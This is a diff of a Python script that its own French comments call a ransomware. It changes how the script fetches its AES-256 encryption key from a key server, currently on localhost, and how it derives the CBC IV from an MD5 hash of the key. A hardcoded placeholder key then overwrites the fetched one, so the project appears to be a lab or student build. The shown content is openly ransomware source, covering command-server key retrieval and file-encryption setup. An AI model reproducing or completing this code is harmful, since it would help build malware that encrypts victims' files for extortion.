@@ -1,6 +1,7 @@
 import sys
 from requests.exceptions import ConnectionError
 import os
+import binascii
 import getopt
 import json
 import hashlib
@@ -36,7 +37,7 @@ def pad(s):
 #parametre un aes256 en fonction de la clé de chiffrement
 def genereaes(key):
 
-	iv = hashlib.md5(key.encode()).digest()
+	iv = hashlib.md5(key).digest()
 	cipher = AES.new(key, AES.MODE_CBC, iv)
 	return cipher
 	#Parametrage de l'AES
@@ -144,8 +145,10 @@ def dechiffre():
 
 def getkey():
 	try:
-		r = requests.get('http://127.0.0.1:6666/') #Le ransomware va chercher la clé sur le serveur et l'obtient en format json
-		key = r.json()
+		r = requests.get('http://127.0.0.1:8080/cle.txt') #Le ransomware va chercher la clé sur le serveur et l'obtient en format json
+		key = ((r.text).split(":"))[1]
+		key = binascii.unhexlify(key)
+		
 		key = b"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
 		return key
 
